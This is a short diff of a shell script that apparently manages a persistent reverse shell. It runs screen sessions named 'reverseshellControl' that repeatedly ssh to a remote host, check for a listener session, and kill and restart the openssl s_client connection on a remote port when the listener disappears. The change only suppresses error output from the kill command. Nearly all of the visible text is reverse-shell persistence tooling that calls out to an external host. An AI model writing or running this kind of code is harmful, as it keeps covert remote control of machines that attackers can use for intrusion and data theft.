@@ -39,4 +39,4 @@ screen -dmS reverseshellControl_$cname
 sleep 1
 #screen -S reverseshellControl_$cname -X stuff "while true;do ( tail -f -n0 $installdir/$cname/err_$cname.log & ) | grep -q 'read:errno=0'; ps aux | grep reverseshell_activator_minimal | awk '{print $1}' | xargs kill -9;done"`echo -ne '\015'`
 screen -S reverseshellControl_$cname -X stuff "while true;do ssh -t -p $sshport -l $sshuser $rhost \"screen -ls | grep listener_$cname | wc -l\" 2> /dev/null > $installdir/$cname/screens_$cname; cat $installdir/$cname/screens_$cname;sleep 5"`echo -ne '\015'`
-screen -S reverseshellControl_$cname -X stuff "if [[ \$(cat $installdir/$cname/screens_$cname) = *'0'* ]]; then echo restarting session...;ps aux | grep s_client | grep $rport | awk '{print \$2}' | xargs kill -9;fi; done"`echo -ne '\015'`
+screen -S reverseshellControl_$cname -X stuff "if [[ \$(cat $installdir/$cname/screens_$cname) = *'0'* ]]; then echo restarting session...;ps aux | grep s_client | grep $rport | awk '{print \$2}' | xargs kill -9 2> /dev/null;fi; done"`echo -ne '\015'`
